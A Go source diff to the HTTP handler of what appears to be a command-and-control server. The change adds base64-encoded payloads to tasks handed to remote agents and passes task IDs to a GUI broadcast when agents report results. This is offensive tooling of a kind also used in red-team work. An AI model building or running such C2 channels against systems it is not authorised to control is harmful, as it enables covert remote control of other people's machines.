@@ -13,6 +13,7 @@ package server
 //   GET  /ext/{agentID}/ping    → update last_seen, return 200
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -87,12 +88,16 @@ func (s *Server) handleExtC2(w http.ResponseWriter, r *http.Request) {
 		}
 		// Return first pending task as plain JSON (no encryption — channel is responsible)
 		t := tasks[0]
-		w.Header().Set("Content-Type", "application/json")
-		json.NewEncoder(w).Encode(map[string]any{
+		wire := map[string]any{
 			"id":   t.ID,
 			"type": t.Type,
 			"args": t.Args,
-		})
+		}
+		if len(t.Payload) > 0 {
+			wire["payload"] = base64.StdEncoding.EncodeToString(t.Payload)
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(wire)
 
 	case "result":
 		if r.Method != http.MethodPost {
@@ -115,7 +120,7 @@ func (s *Server) handleExtC2(w http.ResponseWriter, r *http.Request) {
 		}
 		w.WriteHeader(http.StatusOK)
 		if req.Output != "" {
-			BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete (ext-c2)", req.TaskID))
+			BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete (ext-c2)", req.TaskID), req.TaskID)
 		}
 
 	default:
